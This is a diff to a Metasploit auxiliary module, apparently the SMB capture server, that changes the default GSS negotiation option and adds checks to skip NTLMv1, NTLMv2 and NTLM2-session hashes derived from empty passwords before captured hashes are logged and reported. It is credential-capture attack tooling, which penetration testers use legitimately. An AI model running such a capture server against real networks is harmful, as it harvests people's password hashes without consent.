@@ -63,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				OptBool.new("SMB_EXTENDED_SECURITY",  [ true, "Use smb extended security negociation, when set client will use ntlmssp, if not then client will use classic lanman authentification", false ]),
 				OptBool.new("NTLM_UseNTLM2_session", [ true,  "activate the 'Negotiate NTLM2 key' flag in ntlm authentification when  smb extended security negociation is set,  client will use ntlm2_session instead of ntlmv1 (default on win 2K and above)", false ]),
-				OptBool.new("USE_GSS_NEGOCIATION",    [ true, "Send an gss_security blob in smb_negociate response when smb extended security is set, when this flag is not set windows will respond without gss encapsulation, ubuntu will still use gss", false ]),
+				OptBool.new("USE_GSS_NEGOCIATION",    [ true, "Send an gss_security blob in smb_negociate response when smb extended security is set, when this flag is not set windows will respond without gss encapsulation, ubuntu will still use gss", true ]),
 				OptString.new('DOMAIN_NAME',          [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
 			], self.class)
 
@@ -440,19 +440,62 @@ class Metasploit3 < Msf::Auxiliary
 			@previous_lm_hash = lm_hash
 			@previous_ntlm_hash = nt_hash
 
-			#TODO: check if the hash crrespond to an empty password
-			if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE  and  (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
-				lm_hash_message = "Disabled"
-			elsif  ntlm_ver == NTLM_CONST::NTLM_V2_RESPONSE and lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
-				lm_hash_message = "Disabled"
-				lm_chall_message = 'Disabled'
-			else
+			# Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly
+			case ntlm_ver
+			when NTLM_CONST::NTLM_V1_RESPONSE
+				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
+								:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })
+					print_status("NLMv1 Hash correspond to an empty password, ignoring ... ")
+					return
+				end
+				if (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
+					lm_hash_message = "Disabled"
+				elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
+								:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })
+					lm_hash_message = "Disabled (from empty password)"
+				else
+					lm_hash_message = lm_hash
+					lm_chall_message = lm_cli_challenge
+				end
+			when NTLM_CONST::NTLM_V2_RESPONSE
+				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
+								:cli_challenge => [nt_cli_challenge].pack("H*"), 
+								:user => Rex::Text::to_ascii(smb[:username]), 
+								:domain => Rex::Text::to_ascii(smb[:domain]),
+								:ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })
+					print_status("NTLMv2 Hash correspond to an empty password, ignoring ... ")
+					return
+				end
+				if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
+					lm_hash_message = "Disabled"
+					lm_chall_message = 'Disabled'
+				elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
+								:cli_challenge => [lm_cli_challenge].pack("H*"), 
+								:user => Rex::Text::to_ascii(smb[:username]), 
+								:domain => Rex::Text::to_ascii(smb[:domain]),
+								:ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })
+					lm_hash_message = "Disabled (from empty password)"
+					lm_chall_message = 'Disabled'
+				else
+					lm_hash_message = lm_hash
+					lm_chall_message = lm_cli_challenge
+				end
+
+			when NTLM_CONST::NTLM_2_SESSION_RESPONSE
+				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
+								:cli_challenge => [lm_hash].pack("H*")[0,8],
+								:ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })
+					print_status("NTLM2_session Hash correspond to an empty password, ignoring ... ")
+					return
+				end
 				lm_hash_message = lm_hash
 				lm_chall_message = lm_cli_challenge
 			end
 
+
+			# Display messages
 			capturedtime = Time.now.to_s
-		case ntlm_ver
+			case ntlm_ver
 			when NTLM_CONST::NTLM_V1_RESPONSE
 				capturelogmessage =
 					"#{capturedtime}\nNTLMv1 Response Captured from #{smb[:name]} \n" +
@@ -479,6 +522,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			print_status(capturelogmessage)
 
+			# DB reporting
 			report_auth_info(
 				:host  => smb[:ip],
 				:port => datastore['SRVPORT'],
